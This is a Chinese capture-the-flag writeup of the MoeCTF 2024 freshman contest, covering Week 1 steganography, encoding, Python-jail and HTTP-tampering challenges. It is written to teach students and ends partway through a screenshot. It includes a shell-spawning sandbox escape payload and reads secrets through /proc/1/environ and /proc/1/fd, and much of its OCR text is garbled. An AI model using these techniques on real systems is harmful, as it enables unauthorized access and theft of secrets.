---
title: '2024 MoeCTF 新生赛 Writeup'
description: '环境开启的一分钟内，将所有人员改成 已签到，luo 改成缺勤，点击完成即可拿到 flag'
pubDate: 2024-09-20
author: 'IHK-1'
tags: ['CTF', 'MoeCTF', '新生赛', '2024']
---

```plain
注：
 - 仅供南昌航空大学网安专业新生复现参考！
 - 所有 flag 请自行复现提交，请勿提交文章中的flag，否则账号会被封禁！
 - 不会的地方可以联系学长
```

# WEEK 1
## MISC
### singin
环境开启的一分钟内，将所有人员改成 已签到，luo 改成缺勤，点击完成即可拿到 flag

### 罗小黑战记
<!-- 这是一张图片，ocr 内容为：中秋节 -->
![](https://cdn.nlark.com/yuque/0/2024/gif/35229002/1723275124979-dc3b3495-9a12-4adb-9fd2-278d34c53a58.gif)

下载附件，得到一张动态图，<font style="background-color:#FCE75A;">图中偶尔会闪过一些信息</font>，尝试搜索在线网站，gif 图分解

【技巧】：<font style="background-color:#FCE75A;">很多东西需要自己搜索总结的，请自行尝试搜索，</font>作者就不提供链接了

进行 gif 分割，找到几张含有信息的图片

<!-- 这是一张图片，ocr 内容为：TAK3 -->
![](https://cdn.nlark.com/yuque/0/2024/gif/35229002/1723275132741-76ba2de6-a08c-4be5-b982-193d882f12ef.gif)

<!-- 这是一张图片，ocr 内容为：手速大比拼 FLA WHERZ IS IT? 下回分解 -->
![](https://cdn.nlark.com/yuque/0/2024/gif/35229002/1723275139656-1175619f-fcf0-4f22-bf71-7ebe47eefe06.gif)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723314501039-142a65ec-b99f-4ca6-8043-1d8140e4ef53.png)

扫描二维码拿到 flag

### 杂项入门指北
其MISC入门指北的pdf文档中，提示我们 flag 在海报中

在海报中，侧面线条隐藏着莫斯密码

<!-- 这是一张图片，ocr 内容为：MOECTET XDSEC 多样的 比赛方向! MOECTF涵盖了各种刺激又有趣的 比赛方向,包括: 渗透攻防,黑客王者征途 WEB 破译加密信息,感受密码学与数学之美 CRYPTO 泄漏信息,篡改数据,进入后门,砰! PWN 意想不到的线索让众多"妙"星人聚集 MISC 为数字宇宙添砖加瓦 DEV 在二进制的世界中沙里淘金 REVERSE 零基础新生亦可展现才华,探索网络安全的奥秘! 比赛官网:HTTPS://CTF.XIDIAN.EDU.CN -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723275701407-55995026-e5d3-490f-a051-778380ad0a17.png)

搜索一些解密网站，使用在线网站将莫斯密码解密拿到flag，推荐网站：[CyberChef](https://cyberchef.org/)

<!-- 这是一张图片，ocr 内容为：LLYDILIDILLY DITELLUGILIDITILLUGILLUGILIDITILIDITIONLLYDIDITILIDITILIDILIDITILIDITILIDITILIDITIOND 呻哩呼哩(..72.. 应急响应 THINK PHP漏洞总结... CTF笔记 知识库 MISC在线工具 WEB CTF 文章列表|NSSCTF DOWNLOAD CYBERCHEF LAST BUILD:2 YEARS AGO OPERATIONS RECIPE INPUT FROM MOR FROM MORSE CODE FROM MORSE CODE LETTER DELIMITER WORD DELIMITER LINE FEED SPACE FAVOURITES DATA FORMAT ENCRYPTION/ENCODING PUBLIC KEY ARITHMETIC/LOGIC NETWORKING LANGUAGE UTILS OUTPUT DATE/TIME H4VE_A_G00D_T1ME COMPRESSION -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723275878618-f83f6c42-b066-4322-bfe0-8705bf53d4fa.png)

### ez_F5
下载得到一张妙蛙种子图片，其属性中含有密码

<!-- 这是一张图片，ocr 内容为：SUANTOUWANGBAJPG属性 详细信息 以前的版本 常规 安全 属性 值 说明 标题 主题 分级 标记 备注 NZXV64DBONZXO33SMQ-三三三三三 来源 作者 拍摄日期 程序名称 获取日期 版权 图像 图像ID 分辨率 425X 189 宽度 425像素 189像素 高度 水平分辨率 96 DPI 垂直分辨率 96 DPI 位深度 24 删除属性和个人信息 确定 取消 应用(A) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723276004776-161cb530-59ea-42d1-b162-b8bc179ecfb9.png)

【技巧】：推荐可以<font style="background-color:#FCE75A;">自行总结一下 MISC 编码特征</font> ，或者查看他人文章，之后遇到这样的编码就可以快速的识别出是什么编码，base32 解密得到 no_password，

【技巧】：<font style="background-color:#FCE75A;">推荐使用 010editor 来分析二进制的文件</font>，因为其提供了丰富的模板，可以快速的定位各种信息

在模板中翻阅，看到一段信息

<!-- 这是一张图片，ocr 内容为：010 EDITOR-CAUSERS\HK\DESKTOP|SUANTOUWANGBAJPG 文件日提出回提紧(提紧U,格式0)脚本D)脚本D 调试D)项目(D)工具D省口W) 帮助(H) 工作区 起始页 TOUWANGBA.JPGX 0123456789ABCDEF 文件 路径 888888 0000000000 OO. 00000000 01COH 88888 8888 打开的文件 00000000000 00000000 1D0H 00 00 00 00 00 00 00 00 0000000000 SUANTOU...GBAJPG C.................................................GBAJTOU.NTOUTOUANTOU...... 1EOH 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00000000000000000000000000 0000000000 N01F0H 项目 0000 00 00 00 00 00 00 00 000000000 0200H 收藏的文件 00 00 00 00 00 00 00 00 00 00 00 00 00 000000000000 0210H 最近的文件 8000000000000000000000000000000000 0220H 0000 00 00 00 00 00 C....P\ 00 00 00 00 00 00 00 00  0230H 海约.PNG 00 00 00 00 00 00 00 00000000000000 00000 0240H C....PL 海豹.JPG 00000000000000000 000 00 00 00 00 00 00 00 0250H CI...PL OUT.XML 0000000000000000000000000000000000000 0260H C....PL ENJOY.WAV 0270H 000000000000000000000000000006E006F006 0280 5F007000610073007300 P.A.S.S.W.O.R 0077006F007200 SHELL.PNG C....PL 64000000FFFFFE00424A504547 47 2045 63 102901 D..YB.BJPEG ENC CI...PL DATA 6F 64 65 72 20 43 6F 70 79 72 69 67 72 67 68 74 20 31 02A01 ODER COPYRIGHT 111 C....P\ 39 39 38 2C 20 4A 61 65 73 20 52 52 2E 20 57 65 02B01 JAMES R.WE 998 456C656374 65 6B 73 20 61 6E 64 20 42 69 6F 45 6C EKS AND CACA,EXE BIOELECT C....PL 02C01 726F4D6563682E00 DO FF E1 01DD6874747470 02D0 YA.YHTTP ROMECH. CHALL.WAV CI...PL 64 6F 62 65 2E 63 6F 6D 2F 3A 2F 2F 73 2E 61 64 6 02E0 //NS.ADOBE.COM/ DOWNLOAD.VSIX CI....PL 30 2F003C 3F 78 70 61 6B 78 61 70 2F 31 2E 30 2F 02FOH XAP/1.0/.<?XPACK 65 74 20 62 65 67 69 6E 3D 27 EF BB CI...P1 DOWNLOAD.DAT BBBF27 20 69 0300H ET BEGIN I I 64 3D 27 57 35 4D 30 4D 70 43 65 6 6869487A72 3DAID53..250.2IN 0310H D'WSMOMPCEHIHZR 65 53 7A 4E 54 63 7A 68 63 39 64 2 78 35 35 98 93 0320H ESZNTCZKC9D ?>. 地项目 工作区 资 0330H 3C 78 3A 78 6D 70 65 74 61 207 <X:XMPMETA XMLNS 1646F62653A6E 73 3A 6D 65 74 3A 78 3D 22 61 6 0340H 检查器 :X'ADOBE:NS:MET 3A 52 44 46 20 20 78 6D 6C 61 2F 22 3E 3C 72 66 0350H A/'><RDF:RDF XML 类型 3A 2E 2E 77  NS RDF-"HTTN'/W A 6E 73 3A 72 64 66 30 22 68 74 74 70 3A 0360H 模板结果-JPG.BT C 进制 11111111 开始 值 大小 颜色 名称 有符号字节 -1 无符号字节 OH 255 FG: B 494BH STRUCT JPGFILE JPGFILE B M_SOI(FFD8H) -257 有符号短型 ENUM M ID SOIMARKER 2H FG: 65279 无符号短型 12H B STRUCT APPO APPO FG. 1107361535 有符号整型 280H 14H STRUCT APP1 APP10] FG 无符号整型 JPEG ENCODER COPYRIGHT 1998,JAMES R. WEEKS AND BIOE... 1107361535 44H 294H STRUCT COMMENT COMMENT FG1 有符号 INT64 STRUCT APP1 APP1[1] 513559922... 1DFH 2D8H FG: 无符号INT64 513559922... STRUCT DOT DQT[O] B 4B7H 45H FG: 8.河占数 STRUCT DOT DQT[1] 45H 4FCH FG 照可 检查照 变量 查找结果 值 地址 多文件中查找 GOV反汇编器 直方图 查找结果 校验和 云输出 进程 选定:68[44H]个字节(范围:660[294H]到727[2] 7[2D7HL) 开始:660[294H]选定:68[44H]大小:18.763 中国  插入 十六进制(H)ANSI小端 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723276211005-21560b61-43ca-4f99-a8dd-db347213f06c.png)

【技巧】：<font style="background-color:#FCE75A;">这段文字当你没有思路的时候可以搜索一下这是什么</font>，可以搜索到这是 F5 隐写的特征（当然根据题目名称也可以，但是需要丰富的做题经验）

使用 F5 隐写工具，具体使用方法需要自己搜索并总结，根据 no_password ，使用其作为密码进行解密，得到 flag

<!-- 这是一张图片，ocr 内容为：- ROOTS KALI)-[F5-STEGANOGRAPHY] JAVA EXTRACT /ROOT/桌面/SUANTOUWANGBA.JPG -P 'NO PASSWORD" JAVA_OPTIONS: -DAWT.USESYSTEMAAFONTSETTINGS-ON -DSWING.AATEXT-TRUE PICKEDUP_JAVA HUFFMAN  DECODING STARTS PERMUTATION STARTS 124416 INDICES SHUFFLED EXTRACTION STARTS LENGTH OF EMBEDDED FILE:28 BYTES (1,127,7) CODE USED /ROOT/F5-STEGANOGRAPHY/OUTPUT 文件(F) 编辑(E) 搜索(S) 索(S) 视图(V)文档(D)帮助(H) 4CX后口QQU 警告:您正在使用ROOT账户. MOECTF{F5 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723314532033-c0932df4-aba5-4157-bc04-11072232c6c1.png)

### 捂住一只耳
根据音频中的信息，得到以下数字

```plain
63 31 43 31 41 52 31 51 71 101

对应QWER上的键盘坐标，例如 63 为 第六排第三列字母，对应 N
N E V E R G E T U P
```

### redeme
连接后，有一个验证方式，其意思为 两端字符串 拼接，例如 A+B=? 即AB

```plain
--------------------------------------------------
# import ...

fd = open("/tmp/therealflag", "r")
the_real_flag = fd.read().strip() # u can't catch me, i am ________
os.system("rm /tmp/therealflag")

def handle(input, print) -> NoReturn:
    pass # not implemented yet
def main():
    pass # not implemented yet
if __name__ == "__main__":
    main()
--------------------------------------------------
```

由于无法直接拿到这个文件，但是这个python文件加载了 /tmp/therealflag ，<font style="background-color:#FCE75A;">那么思路可以转变为就需要找到一个文件可以查看到这个进程加载的内容</font>，经过搜索 kali 系统中 /proc/pid 中可以查实现，具体linux中 /proc/pid 各个目录的文件作用，还需自己查找总结

以下为一个示例：

<!-- 这是一张图片，ocr 内容为：进程信息 在/PROE文件系统中,每一个进程都有一个相应的文件.下面是/PROC目录下的一些重要文件: /PROC/PID/EMDLINE包含了用于开始进程的命令; /PROC/PID/CWD包含了当前进程工作目录的一个链接; /PROC/PID/ENVIRON 包含了可用进程环境变量的列表; /PROC/PID/EXE包含了正在进程中运行的程序链接; /PROC/PID/包录包含了进程打开的每一个文件的每一个文件的链接; /PROC/PID/MEM包含了进程在内存中的内容; /PROC/PID/STAT包含了进程的状态信息; /PROC/PID/STATM包含了进程的内存使用信息. -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723280631320-d49bde12-cfd4-4a6d-ab90-27bb90a07685.png)



先尝试了 /proc/1/environ 查看工作环境，发现其环境正是一个 python 环境，正对应了这个 python 文件，该文件进程为 pid=1 

<!-- 这是一张图片，ocr 内容为：LLY DITION  UND ING ING ING ING INGLING INGLINGLINGLING ING ING ING INGLING ING INGLINGLINGLING 6FB7B781206356F45AD79EFBB19322CAA6C2A5AD39092D0D44DOFEC94117E118 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723283230056-9a502e82-a5a3-43f2-8bf7-8b3a18051835.png)

那么我们可以根据 <font style="background-color:#FCE75A;">/proc/1/fd/id 继续查看程序链接（假设链接到的是打开的文件/proc/1/fd/1 链接到的是 /etc/passwd，那么打开 /proc/1/fd/1 等价于打开 /etc/passwd）</font>，注意： 请勿从 0/1/2 开始，可能会造成靶机卡死！

多此尝试，在/proc/1/fd/3  中查看到 flag

### pyjail
```plain
__import__('os').system('sh')
```

cat wrapper 获取到flag生成源码

<!-- 这是一张图片，ocr 内容为：CAT WRAPPER.SH #!/BIN/SH # FLAG-"TEST{THIS_IS_THE_TEST_FLAG_AND_NEVER-BE_USED_IN-PRODUCTIONJ" ECHO "$FLAG" > "/TMP/.THEREALFLAG-$(ECHO "$FLAG" | SHA512SUM)" UNSET FLAG FILE$(WHICH "$O") DIR$(DIRNAME "$FILE") EXPORT PYTHONPATH"$DIR:$PYTHONPATH" HON "$DIR/MAIN.PY""$@" EXEC PYTHON -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723807604660-29555f27-7b5a-476f-852f-13199fe86f18.png)

查看 tmp 目录所有文件

<!-- 这是一张图片，ocr 内容为：T PYTHONPATH"$DIR:$PYTHONPATH"" EXPORT PYT "$DIR/MAIN.PY""$@"LS-AL /TMP EXEC PYTHON "$D TOTAL 12 4096 AUG 16 11:05 . 1 ROOT ROOT DRWXRWXRWT 4096 AUG 11:05 ... ROOT DRWXR-XR-X 1 ROOT 63 AUA 16 11:05 .THEREALFLAG-60EE450A38161FD417765368488D4FE34D5BB4DD14D8666666C98 11000 ROOT -1W-1-1 0E6AE21691B89699189AD5026542DOCE343749203E96817668FBE29E310F64D9E65E82D55796D4 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723807636739-1c004397-e38d-42bd-92c4-004d15548a0a.png)

但是文件名一直 cat 不到，直接尝试模糊匹配到

<!-- 这是一张图片，ocr 内容为：).SYSTEM('SH) GIVE ME YOUR PAYLOAD: LS-AL /TMP TOTAL 12 4096 AUG 16 11:05 DRWXRWXRWT ROOT 4096 AUG 16 11:05 .. DRWXP-XR-X 1000 -PW-P-T CAT /TMP/.THERE* YOU-KNOW-HOW_TO-3SCEP3_SIMPLE-STRING.F1LTER0 MOECTF[AH-H4-NOW_YOU-H -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723807813172-53a10870-08a4-4c0c-ad89-27b1be7abe45.png)

## WEB
### web入门指北
其web入门指北文件中，有 www 站点 附件，可以使用 study_php 进行站点搭建，<font style="background-color:#FCE75A;">具体自己搜索搭建</font>，关键词：小皮搭建网站，搭建完成后访问站点即可获取 flag

### 弗拉格之地的入口
其给出提示爬虫可以确定目录： robots.txt ，ROBOTS协议，用来指示搜索引擎爬虫哪些页面可以爬取，哪些不可以，当然也可以使用 dirsearch 等工具进行目录扫描，

在 robots.txt 中，其禁止爬虫爬取 webtutorEntry.php，访问即可拿到 flag

### ez_php
入门挑战，适合了解一些 HTTP协议，以及了解使用 burpsuite

HTTP协议参考网站：[HTTP | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP)

1.请求方法：

访问的适合其要求使用 POST 方法访问，将 GET 改为 POST 即可进行下一步，推荐在红圈位置处选择修改请求方法

<!-- 这是一张图片，ocr 内容为：BURPSUITE专业饭V2024.2.1- 查看 小精助 O 搜索 设置 目志 对比工具 扩展 编码工具 学习 ORGANIZER 王放登 COLLABORATOR R 目标:HTTP://127.0.1:53735 HTTP/1 X 清求 啊应 INSPECTOR 2 活动网络 页面冒染 美化 美化 HEX HTTP/1 功议 HTTP/2 2 MOET:127.0.1:53735 名称 伯 G+XML,*/*1Q.8 四等记 方法 GET 5,ACCEPT-LANQUAGE: WH-CH,WHJQ.B,WA-TI:Q-0.7,亚H-日KIQ-0.5,EA-05:Q-0.9,EHIQ. / 路径 6 ACCEPE-INCODING:OSIP,DEFLATE,BS CONSECTION: ELOSE UPGRADE-INSECUCE-REQUESTS: 9 SEO-FETCH-DESTI DOCUMENT O 请求查询参数 LO SEO-FETCH-KODE: NAVIGATE LLSEC-FETCH-SITEI NONE 请求主体参数 O 13 SEC-FETCH-USER! 71 PXLOXISY:U-O N 请求COOKLES 12 请求头 HIT THE QUESTION SETTER PLEASE USE POST M METHOD 搜索 0高亮 完成 2.500字节383MILLIS EVENT LOG(3) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723286624774-a67aac68-7673-4909-98b9-75f198dcac97.png)

2.POST 请求参数

<!-- 这是一张图片，ocr 内容为：BURP SUITE专业版 V2024.2.1- 临时项目-SCENSED TO LEON406 查看 小精助 O 搜索 设置 日志 对比工具 扩展 编码工具 ORGANLZER 学习 王放登 COLLABORATOR HTTP/1  目标:HTTP://127.0.1:53735  发送 三 X 响应 请求 INSPECTOR 2 活家属性 美化 页医治院 美化 RAWW HEXX 协议 HTTP/1 HTTP/2 HOST:127.0.1:53735 L: HOWILLA/5.O (NINDOWS HT IO.D; WIN64; X64; EV:129.0) GECKO/2D1001 FIREFOX/139.0 3 TEER-AGENT INO 名称 604GJOD/XBEML:APPL,APPLIGATION/XML:Q-9,IMAGE/&VIL,LMEGE/WEBD,LMAGE/PEGE/PEG,LMAGE/EV 9+XML,*/*:Q-0.8 方法 四等记 5/ACCEPE-LANGUAGE: A江-CH,ZH,ZH,G,公位-T量;Q-0.7,公过一团.7,公司-0.5,公司-08:Q-0,3,会议IQ-0. 格径 6 ACCEPE-ENCODING: GAIP,DEGLATE,BE CONAECTION: ELOSE 0 SEC-FETCH-PEATIDOCUMENT 请求查询参数 SEC-FECCH-HODE:NAVIGATE 请求主体参数 1 SEC-FETEB-TUEX! PRIOKIEY:W-O I CONTENT-TYPE:APPLICATION/X-VVW-FOXU-UCLENEODED O 汤家COOKLES 15 CONTENG-LENUTH:O HIT THE QUESTION SETTER 14 海求头 PLEASE POST THE PARAMETER IMOAUSB 搜索 0两亮 完成 2.512字节362MILLIS EVENT LOG(3) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723286707188-91f479b9-81b4-448b-bea3-0b6dbf06d8d9.png)

3.GET 请求参数

<!-- 这是一张图片，ocr 内容为：BURP SUITE专业饭 V2024.2.1- 查看 帮助 O 搜索 设置 日志 对比工具 扩展 编码工具 ORGANIZER 学习 王放登 COLLABORATOR HTTP/1  目标:HTTP://127.0.1:53735  V 取消 三 X 请求 明应 2 页面追染 美化 万家居性 关化 RAW 协议 HTTP/1 2 HOST HTTP/2 127001:53735 S(DHEL-ANENT: HOEMLA/5.D (GLA/SDIDI FIT IO:D3 WINGES X6E; EVII29.D) GEEKOF3DIODIDIDI FIZEFOX/129.D A  ACEPE: 名称 LXBTHL+XBL,APPLICATIOA/XML:Q-O.G,IMAGE/AVLL,LMAGE/WEBP,IEAGE/PUGE/PUGE/SY SEXT/BCML,EPP11 G+XML,*/*:Q-0.8 四等记 方法 POST 400.SH-TW:Q-0.7,SH-EX/Q-0.5,EA-0S/Q-0.3.2 ACCEPE-LANGUAGE:SH-CN,SH 路径 ACCEPE-ENCODING:GSIP,DECLATE 7 CONNECSION: ELOSE 请求查询参数 SEC-FETCH-DEST:DOCUMENENE SEC-FESCH-HODE:NAVIGATE STESTECCH-USEE: 请求主体参数 1 红红红红红奶茶 ISPRIORITY:U O,I CONTENT-TYPE:APPLICATION/X-VVY-FORM-UR LENCODE O 汤家COOKLES CONTENT-LENGTH:8 14 海求头 HIT THE QUESTION SETTER PLEASE GET THE METER XT大帅B PAR 搜索 0两亮 完成 2.513字节420MILLIS EVENT LOG(3) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723286763963-9c271204-9ee3-4c0e-958c-97b0c49719e5.png)

4.访问来源 referer

<!-- 这是一张图片，ocr 内容为：BURP SUITE专业版 V2024.2.1 - 查看 小精助 O 搜索 设置 日志 对比工具 扩展 编码工具 ORGANIZER 学习 王放鉴 COLLABORATOR HTTP/1  目标:HTTP://127.0.0.0.0. V 发送 三 X 请求 明皮 INSPECTOR IN           N       UND 2 页面宣杂 关化 请求国信 美化 RAW -4E5444474E54B04056 HTTP/1.1 HTTP/1 协议 MO95:137.0.0 0.0.153735 名称 SEXT/BTML,APPLIC PPLLGAUION/XBLIXML,APPIIGATION/XHLIA-D.9,S,S,LWADE/AVEDE/WEDE/VEBD,IREGE/PUGE/PUGE/SV 方法 POST 5,GCEPE-LANGHAQ省:蓝江-ON-QH,G-Q,G,公司,公司:Q-0.7,这红一日K;Q-0.5,EA-08;Q-0.3,EXIQ-0, 路径 6 ACOEPE-INCODING:GSIP,DEFLATE,BS CONNECTION:CLOGE 请求查询参数 SEC-FESCH-DEST:DOCWENT LSGEO-RETEB-SIDE:NOXLOATE 值 名称 2SEC-FETCB-TEEX:71 PRLORLEY:U-0,1 XT BEFERER:HTTYS://VWW.XIDIAN.EDU.ON/ HIT THE QUESTION SETTER 请求主体多数 请求COOKIES THE SOURCE MUST BE 15 语求头 HTTPS://WWW.XIDIAN.EDU.CN 搜索 0两亮 2.523字节|342MILLLS 完成 EVENT LOG(3) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723287104519-c7d13af4-4f8e-4093-b634-acf52e5dc4f9.png)

5.Cookie

<!-- 这是一张图片，ocr 内容为：BURP SUITE专业版 V2024.2.1- 查看 小君助 O 搜索 设置 日志 对比工具 扩展 编码工具 ORGANLZER 学习 王放鉴 COLLABORATOR HTTP/1  41 目标:HTTP://127.0.1:53735  V 三 X 请求 明应 INSPECTOR 2 阿家园性 RAW 美化 美化 页面包染 -4E5444A74E54B0485B HTTP/1.1 协议 HTTP/1 HTTP/2 MO9T:127.0.0 0.0.153735 名称 SEXT/BTML,EPPLICA PPLLQALIOB/XBLWL+KSL,EPPLICATION/XMLID-D.9,IMEGE/EYER,EMEDE/WEBP,IMEGE/POGE/POD,IMAGE/GY G+XML,*/*;Q-0.8 方法 POST 6ACCEPE-ENCODING:OAIP,DETLATE,BE 路径 CONWECTION: CLOSE UPGRADE-TNSECUCE-REGUESTS:I 请求查询多数 SEG-FESCH-DEST;DOCURENENE SEQ-FETCH-8ITE: NONE 值 名称 SEO-FESCH-UOEX1 PXLORIEY:W-011 XT 1: CONSENS-TYPEI APPLICASLON/X-YYYY-FORM-URLENCODED 5CONSENT-LENGT):8 请求主体参数 191 请求COOKIES 16 请求头: HIT THE QUESTION SETTER PLEASE SET COOKIE: USERADMIN 搜索 0高亮 完成 2.507字节474MILLIS EVENT LOG(3) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723287146430-c6a1fbff-4990-4e8f-80f0-cca1cf9bff37.png)

6.UserAgent

<!-- 这是一张图片，ocr 内容为：BURP SUITE专业版V2024.2.1 查看 临时项目-FCENSED TO LEON406 小精助 O 搜索 设置 日志 对比工具 扩展 编码工具 ORGANLZER 学习 王放登 COLLABORATOR HTTP/1  目标:HTTP://127.0.1:53735 V 发送 三 X 请求 响应 INSPECTOR 2 IN 三 请求居性 美化 美化RAW 1POST/2XE-4E54A44A74E54B0485B HTTP/1.1 HTTP/1 办议 HTTP/2 26581197010889706 USER-AGENS: WOEDEDICATED3ROWSER 名称 LICATION/XML:Q-D.G,IMAGE/AVIT,IMAGE/VEBP,IMAGE/PNG,IMAGE/GY SEXT/BTML,APP1ICE EION/XBTM1+XML,AP.LICAT I 方法 POST ACCEPT-LANGUAGE:SH-CH-CH,SH/Q.SH-T -0.7,SH-BK/Q-0.5,EN-03:Q-0.3.EN/Q-0.2 路径 OSIP DEELATE,  CONNECTION: CLOSE SEG-FETCH-DEST:DOCWENS 海求查询办数 10SEG-FETCH-WODE:NAVIGATE SEO-PECCH-BEE:NONE 值 名称 XT CONSENT-TYPE:APPLICATION/X-VVW-FORM-URLENCODED COBTENS-LENGTH:8 6PEFERER:HTEPS://WWW.XIDIAN.EDU.CN/ COODCIE:HWEER-ADLA 请求主体多数 19 请求COOKIES 16 请求头 HIT THE QUESTION SETTER PLEASE USE MOEDEDICATEDBROWSER 搜索 0高亮 完成 2.508字节|388MILLIS EVENT LOG(3) -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723287201801-bdce349d-982c-4e31-9058-98a125eeb957.png)

访问即可拿到 flag

<!-- 这是一张图片，ocr 内容为：BURP SUITE专业饭 V2024.2.1- 查看 小精助 O 搜索 设置 日志 对比工具 扩展 编码工具 ORGANLZER 学习 王放鉴 COLLABORATOR HTTP/1  目标:HTTP://127.0.1:53735  V 三 X 请求 响应 INSPECTOR UN                                                                  2 请求居性 页面音集 美化 美化 RAWV HEX POST/2XE-4E54A44474E54B0485B HTTP/1.1 协议 HTTP/1 HTTP/2 2 HOST:107.0.0.1:53735 3 USER-AGENT:HOEDEDICASEDBROWSES 名称 DEXE/BRMI,EDDLLCATION/XHTMI+XEL,APD:APFICATIONQ/XMLIQFD.5,JMADE/AVEFAVEF ,INAGE/QEBD:IRAGE/SV 方法 POST AGE: GH-CH,WH/Q-0.GL一TM;Q-0.7,兹包-BRIQ-0.5.EN-0S:Q-0.3,EAIQ-0. 路径 6ACCEPE-ENCODING:OSIP,DEGLATE,BR CONAECTION: ELOSE 请求查阅办数 SEO-FETCB-DEST:DOCURENT 10SEO-FESCH-KODE:MAVIGETE SEQ-FETCB-SITE:NONE 值 名你 L8PRIOXLTY:W-0,1 HIT THE QUESTION SETTER CONTENT-TYPE: APPLICATION/X-VVW-FOXM-UCLENCODED CONTENT-LENGTHI6 REFERES:ATEPSI//VVYYIDIAN.EDU.ON/ COOKIE:USERADMIN 请求主体争数 HERE IS YOUR FLAG: 20 请求COOKIES 17 汤求头 MOECTF AI1Y V3RY 搜索 0高亮 2.576字节368MILLIS 完成 EVENT LOG(3) 内存:268.7MB -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723314586862-03a2b3b6-1f56-4cd4-8237-70422c9bcb5d.png)

### ProveYourLove
尝试了多次表白，发现其弹出的信息：

<!-- 这是一张图片，ocr 内容为：当前表白份数:9 FLAG:YOUR LOVE IS NOT YET FULFILLED QIXI FLAG:YOUR LOVE IS NOT YET FULFILLED -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723288675914-6d8f20ab-fd69-4202-8bb0-e7391f8c18f7.png)

not yet fulfilled 提示我们表白的太少了，尝试使用 burpsuite 的 intruder 进行 nopayload 攻击，即使用任何payload，进行循环发送，一段时间后访问

<!-- 这是一张图片，ocr 内容为：原始数据头 JSON 7 过滤 JSON 全部展开 全部折叠 保存 复制 "MOECTF1HAPPY_CHIN3S3 VA13NT QIXI_FLAG: COUNT: 417 "MOECTFLCONGRATULATLONS FLAG: -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723314618881-4652f4c9-d978-4da5-a3a1-ffd8d15fbcbc.png)

拿到七夕的flag，以及该题目的 flag

### 弗拉格之地的挑战
根据提示页面，进行访问，html 中通常会把一些信息注释，不在前端显示出来，这时候 F12 查看源代码即可

<!-- 这是一张图片，ocr 内容为：604PX X922PX </>元素 质性能 汇源代码 至少你会跳转URL(BUSHI 网络 应用程序 内存 控制台 欢迎 <HTML> 现在是第一道题,我们学习的是:HTML <HEAD>@(/HEAD> 这行字的下面一片空白,但是真的什么也没有吗? <P>至少你会跳转UR1(BUSHI</P> <P>现在是第一道题,我们学习的是:HTML < <P>这行字的下面一片空白,但是真的什么也没有吗?</P> <!-恭喜你找到了网页的源代码,通常在这里题目会放一些提示,做题没头缩一定要先进来看一下一> <!--FLAG1:BW91Y3RM...> <!..下一步;/FLAG2HH.PHP.)> </BODY> </HTML> -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723288986017-55dcee43-1ceb-4f02-bf3d-32864ab4015a.png)

第二个 flag，这时候不是在返回页面中看到信息，flag 被藏在了返回包的响应标头中

<!-- 这是一张图片，ocr 内容为：O 恭喜你已经学会了如何查看网页源代码,但这还不够 应用程序 回内存 产性始 向控制台 保证日出 这是第二题,本题关键词:HTTP 口已租止的响应COOKE CE用止请求 口购应教练URI口B窗纱房URL WS 污单 字体 其他 口反找 筹选器 WASM 想想服务器通过网络传输过来的,除了这个页面,还有什么? 第二方请求 60 00% 20  0G 名称 标头 X 预览 @ BOBHLTP://127.00.156534/BA 请求URL HTTPV/127.00.1.56834/11AG2HH.PHP FAVICONICO 请求方法 状实代码 远保地址 12700156834 引用站点策略: 口凉始 KEEP-ALIWE TESTALNT DEND UIF-S SAT,10 AUG 2024 112433 GLAT DATE: FLAG2: HLAG3CDPHE NETPAGE NGINU/1.180 FRANSFER-ENCODING CHURKED PHP/322 -POWERED-BYS ACCEPT-ENCODINGE GEP  DELLE, BE,25LD  2H-CN -09 ENJG 08 ACCEPT-LANGUAGES 3次药象已传输14KB 511KB条资 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1723289387145-6fd05029-ed9a-473b-a41b-d0de4c3799d0.png)

第三个 flag ，需要根据他的步骤，结合 ez_php 学习的传参方法进行解题

<!-- 这是一张图片，ocr 内容为：项目 查看 BURP SUITE专业版 V2024.2.1 - LICENSED TO LEON406 帮助 INTRUDER BURP 重放器 编码工具 O搜素设置 对比工具 扩展学习学习COLLABORATOR 重放器 目标 日志 ORGANIZER 代理 仪表盘 INTRUDER 十 2X 目标:HTTP://127.0.1:56834 HTTP/1 发送 取消 三 X I INSPECTOR 88 请求 响应 INSPECTOR 请求属性 美化 页面渲染 2 美化 RAW HEX HEX RAW POST/FLAG3CAD.PHP?A HTTP/1.1 我想,你应该已经知道DEVTOOLS这个东西了.(不知道也没关系,你F12出来的就是 1 2 HOST:127.0.0.1 :56834 请求查询参数 DEVTOOLS) S USER-AGENT: BOZILA/5.0 (WINDOUS NT 10.0: WIN64: X64: EV:129.0) GECKO/20100101 FIRETOX/129.0 请求主体参数 那么现在在你面前的有两个教程: TEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XMI:Q.9,IMAGE/AVIE,IMAGE/VE 四  笔记 BP,IMAGE/PNG,IMAGE/SVG+XML,*/*:Q*0.8 请求COOKIES 1.尝试把DEVTOOLS运用熟练 5 ACCEPT-LANGUAGE: 